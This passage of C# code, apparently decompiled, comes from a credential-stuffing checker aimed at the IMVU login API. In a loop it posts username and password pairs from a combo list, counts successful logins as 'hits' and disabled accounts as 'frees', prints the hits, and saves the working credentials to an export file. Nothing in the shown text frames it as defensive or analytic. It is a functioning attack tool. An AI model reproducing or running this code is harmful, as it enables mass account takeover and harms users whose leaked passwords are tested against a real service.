        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str1 = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"gdpr_cookie_acceptance\":false}";
              string str2 = httpRequest.Post("https://api.imvu.com/login", str1, "application/json;charset=UTF-8").ToString();
              if (str2.Contains("\"status\":\"success\""))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - IMVU] " + s[0] + s[1], Color.Green);
                Export.AsResult("/Imvu_hits", s[0] + ":" + s[1]);
                return false;
              }
              if (str2.Contains("This account is disabled"))
              {
                ++mainmenu.frees;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[FREE - IMVU] " + s[0] + ":" + s[1], Color.Green);
